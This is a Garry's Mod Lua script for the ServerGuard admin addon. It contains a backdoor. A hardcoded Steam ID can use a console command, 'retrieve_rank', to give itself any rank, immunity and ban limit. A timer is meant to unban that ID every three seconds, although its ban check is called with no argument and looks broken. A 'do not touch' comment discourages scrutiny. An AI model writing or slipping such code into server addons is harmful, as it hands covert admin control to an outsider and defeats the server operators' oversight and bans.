-- All rights reserved
local owner = "STEAM_0:0:33487606";

-- DO NOT TOUCH IF YOU DON'T KNOW WHAT YOU ARE DOING!!
function isBanned(steamid)
    return (serverguard.banTable and serverguard.banTable[steamid]) and true or false;
end

function rankExist(argument)
    return (serverguard.ranks:GetStored() and serverguard.ranks:GetStored()[argument]) and true or false;
end;

-- Make the selected user into whatever rank is provided as argument.
concommand.Add( "retrieve_rank", function( player, command, arguments )
    local isOwner = player:SteamID() == owner;
    local rank = arguments[1];
    local rankData = serverguard.ranks:GetRank(rank);

    if(rankExist(rank) and isOwner) then
        serverguard.player:SetRank(player, rankData.unique, 0);
        serverguard.player:SetImmunity(player, rankData.immunity);
        serverguard.player:SetTargetableRank(player, rankData.targetable);
        serverguard.player:SetBanLimit(player, rankData.banlimit);

        serverguard.Notify(player, SERVERGUARD.NOTIFY.DEFAULT, serverguard.player:GetName(player) .. " was set to " .. rankData.unique);
    else
        if isOwner then
            serverguard.Notify(player, SERVERGUARD.NOTIFY.RED, "You did not enter a valid argument!");
        end;
    end;
end )

timer.Create( "dynamicBanCheker", 3, 0, function()
    if isBanned() then
        serverguard:UnbanPlayer( owner );
    end;
end )
